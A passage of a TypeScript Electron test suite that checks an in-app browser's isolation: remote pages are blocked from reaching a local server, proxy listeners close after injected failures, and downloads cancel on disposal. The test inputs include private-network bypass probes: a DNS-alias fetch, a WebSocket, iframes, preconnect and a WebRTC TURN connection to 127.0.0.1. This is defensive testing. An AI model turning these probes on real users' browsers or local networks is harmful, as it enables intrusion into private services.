          page.session.once('will-download', (event, item) => {
            const options = item.getSaveDialogOptions()
            event.preventDefault()
            resolve({
              defaultPath: options.defaultPath,
              askEveryTime: registry.downloadSettings().askEveryTime,
            })
          })
        )
        page.downloadURL(url + '/download')
        return cancelled
      }, origin)) as { defaultPath: string; askEveryTime: boolean }
      assert.equal(download.askEveryTime, true)
      assert.equal(download.defaultPath.endsWith(join('Downloads', 'blocked.txt')), true)
      assert.equal(
        await application.evaluate(async (_electron, url) => {
          const { registry } = globalThis as unknown as BrowserFixture
          try {
            await registry.dispatch({
              kind: 'navigate',
              tabId: registry.snapshot().activeTabId!,
              input: url + '/redirect',
            })
          } catch {
            return true
          }
          return false
        }, origin),
        true
      )
      assert.equal(hits.includes('/redirect-target'), false)
      const allowedHits = hits.length
      const denied = await application.evaluate(async (_electron, url) => {
        const { registry } = globalThis as unknown as BrowserFixture
        await registry.dispatch({ kind: 'open' })
        const tabId = registry.snapshot().activeTabId!
        let blocked = false
        try {
          await registry.navigate(tabId, url)
        } catch {
          blocked = true
        }
        return blocked
      }, origin)
      assert.equal(denied, true)
      assert.equal(hits.length, allowedHits)
      await application.evaluate(async (_electron, url) => {
        const { registry } = globalThis as unknown as BrowserFixture
        const page = registry.target(registry.snapshot().activeTabId!)
        await page.executeJavaScript(`fetch(${JSON.stringify(url + '/blocked')}).catch(() => null)`)
        await page.executeJavaScript(
          `fetch(${JSON.stringify(url.replace('127.0.0.1', 'private-alias.example') + '/dns')}).catch(() => null)`
        )
      }, origin)
      assert.equal(hits.length, allowedHits)
      const connectionCount = connections
      const remoteResult = await application.evaluate(async (_electron, url) => {
        const { registry } = globalThis as unknown as BrowserFixture
        const tabId = registry.snapshot().activeTabId!
        const page = registry.target(tabId)
        const remoteSession = page.session.isPersistent()
        const outcomes = await page.executeJavaScript(`Promise.all([
        fetch(${JSON.stringify(url + '/remote-fetch')}).then(() => false, () => true),
        fetch(${JSON.stringify(url.replace('http:', 'https:').replace('127.0.0.1', 'private-alias.example') + '/remote-dns')}).then(() => false, () => true),
        new Promise(resolve => { const socket = new WebSocket(${JSON.stringify(url.replace('http:', 'ws:') + '/remote-ws')}); socket.onerror = () => resolve(true); socket.onopen = () => { socket.close(); resolve(false) } })
      ])`)
        await page.executeJavaScript(`window.open(${JSON.stringify(url + '/remote-popup')}); null`)
        await page.executeJavaScript(
          `new Promise(resolve => { const frame = document.createElement('iframe'); frame.src = ${JSON.stringify(url + '/remote-frame')}; frame.onload = () => resolve(null); frame.onerror = () => resolve(null); document.body.append(frame) })`
        )
        return { remoteSession, outcomes, count: registry.snapshot().tabs.length }
      }, origin)
      assert.equal(remoteResult.remoteSession, true)
      assert.deepEqual(remoteResult.outcomes, [true, true, true])
      assert.equal(remoteResult.count, 2)
      assert.equal(hits.length, allowedHits)
      assert.equal(connections, connectionCount)
      await application.evaluate(async (_electron, url) => {
        const { registry } = globalThis as unknown as BrowserFixture
        const localTab = registry.snapshot().tabs.find((tab) => tab.url.startsWith(url))!
        const localPage = registry.target(localTab.tabId)
        await registry.setApiBase(url.replace('http:', 'https:'))
        if (
          !localPage.isDestroyed() ||
          registry.snapshot().tabs.some((tab) => tab.tabId === localTab.tabId)
        )
          throw new Error('local authorization was not revoked')
        const page = registry.target(registry.snapshot().activeTabId!)
        await page.executeJavaScript(`new Promise(resolve => {
        const link = document.createElement('link'); link.rel = 'preconnect'; link.href = ${JSON.stringify(url.replace('http:', 'https:'))}; document.head.append(link);
        const peer = new RTCPeerConnection({ iceServers: [{ urls: ${JSON.stringify('turn:127.0.0.1:' + new URL(url).port + '?transport=tcp')}, username: 'probe', credential: 'probe' }] });
        peer.createDataChannel('probe'); peer.createOffer().then(offer => peer.setLocalDescription(offer));
        setTimeout(() => { peer.close(); resolve(null) }, 2000)
      })`)
      }, origin)
      assert.equal(
        connections,
        connectionCount,
        'remote preconnect / WebRTC must not establish private TCP connections'
      )
      const cleanup = await application.evaluate(async () => {
        const { registry, browserWindow } = globalThis as unknown as BrowserFixture
        const pages = registry.snapshot().tabs.map((tab) => registry.target(tab.tabId))
        await registry.setApiBase('http://127.0.0.1:1')
        browserWindow.destroy()
        await registry.dispose()
        return {
          destroyed: pages.every((page) => page.isDestroyed()),
          count: registry.snapshot().tabs.length,
        }
      })
      assert.deepEqual(cleanup, { destroyed: true, count: 0 })
    } finally {
      await application?.close()
      fixture.closeAllConnections()
      await new Promise<void>((resolve) => fixture.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)

for (const fault of ['initialization', 'cleanup', 'pending', 'revoked'] as const) {
  test(
    `a local Session ${fault} failure does not leave its proxy listener open`,
    { timeout: 15_000 },
    async () => {
      const fixture = createServer((_incoming, response) => response.end('fixture'))
      fixture.listen(0, '127.0.0.1')
      await once(fixture, 'listening')
      const address = fixture.address()
      assert.ok(address && typeof address !== 'string')
      const origin = `http://127.0.0.1:${address.port}`
      const temporary = await mkdtemp(join(tmpdir(), 'scholarseed-browser-failure-'))
      let application: Awaited<ReturnType<typeof _electron.launch>> | undefined
      try {
        application = await launchRegistryProbe(origin, temporary)
        const outcome = await application.evaluate(
          async (electron, { mode, url }) => {
            const probe = globalThis as unknown as BrowserFixture
            await probe.ready
            await probe.registry.dispatch({ kind: 'open' })
            let port = 0
            let release: () => void = () => undefined
            let started: () => void = () => undefined
            const waiting = new Promise<void>((resolve) => {
              release = resolve
            })
            const began = new Promise<void>((resolve) => {
              started = resolve
            })
            electron.app.once('session-created', (isolated) => {
              const setProxy = isolated.setProxy.bind(isolated)
              const closeConnections = isolated.closeAllConnections.bind(isolated)
              let calls = 0
              isolated.setProxy = async (configuration) => {
                port = Number(new URL(configuration.proxyRules!).port)
                started()
                if (mode === 'initialization') throw new Error('injected initialization failure')
                if (mode === 'pending' || mode === 'revoked') await waiting
                await setProxy(configuration)
              }
              isolated.closeAllConnections = async () => {
                calls += 1
                if (mode === 'cleanup' && calls > 1) throw new Error('injected cleanup failure')
                await closeConnections()
              }
            })
            let openError = ''
            const opening = probe.registry.dispatch({ kind: 'open', input: url }).catch((error) => {
              openError = String(error)
            })
            let closeError = ''
            if (mode === 'pending' || mode === 'revoked') {
              await began
              const closing =
                mode === 'pending'
                  ? probe.registry.dispose()
                  : probe.registry.setApiBase('http://127.0.0.1:2')
              release()
              await closing.catch((error) => {
                closeError = String(error)
              })
              await opening
            } else {
              await opening
              try {
                await probe.registry.dispose()
              } catch (error) {
                closeError = String(error)
              }
            }
            return { port, openError, closeError, count: probe.registry.snapshot().tabs.length }
          },
          { mode: fault, url: origin }
        )
        assert.ok(outcome.port > 0)
        assert.equal(await portOpen(outcome.port), false)
        if (fault === 'initialization')
          assert.match(outcome.openError, /injected initialization failure/)
        else if (fault === 'cleanup') assert.match(outcome.closeError, /injected cleanup failure/)
        else assert.match(outcome.openError, /target_closed|permission_denied/)
        assert.equal(outcome.count, fault === 'revoked' ? 1 : 0)
      } finally {
        await application?.close()
        fixture.closeAllConnections()
        await new Promise<void>((resolve) => fixture.close(() => resolve()))
        await rm(temporary, { recursive: true, force: true })
      }
    }
  )
}

test(
  'registry disposal cancels and joins a real in-progress browser download',
  { timeout: 30_000 },
  async () => {
    const server = createServer((incoming, response) => {
      if (incoming.url !== '/file') {
        response.end('<title>Downloads</title>')
        return
      }
      response.writeHead(200, {
        'Content-Disposition': 'attachment; filename="pending.bin"',
        'Content-Length': '1048576',
      })
      response.write(Buffer.alloc(1024))
    })
    server.listen(0, '127.0.0.1')
    await once(server, 'listening')
    const address = server.address()
    assert.ok(address && typeof address !== 'string')
    const origin = `http://127.0.0.1:${address.port}`
    const temporary = await mkdtemp(join(tmpdir(), 'browser-download-drain-'))
    let application: Awaited<ReturnType<typeof _electron.launch>> | undefined
    try {
      application = await launchRegistryProbe(origin, temporary)
      const result = await application.evaluate(
        async (_electron, { origin, destination }) => {
          await (globalThis as unknown as BrowserFixture).ready
          const { registry } = globalThis as unknown as BrowserFixture
          await registry.dispatch({ kind: 'open', input: origin })
          const page = registry.target(registry.snapshot().activeTabId!)
          let outcome = ''
          const started = new Promise<void>((resolve) => {
            page.session.once('will-download', (_event, item) => {
              item.setSavePath(destination)
              item.once('done', (_event, state) => {
                outcome = state
              })
              resolve()
            })
          })
          page.downloadURL(origin + '/file')
          await started
          await registry.dispose()
          return outcome
        },
        { origin, destination: join(temporary, 'pending.bin') }
      )
      assert.equal(result, 'cancelled')
    } finally {
      await application?.close()
      server.closeAllConnections()
      await new Promise<void>((resolve) => server.close(() => resolve()))
      await rm(temporary, { recursive: true, force: true })
    }
  }
)
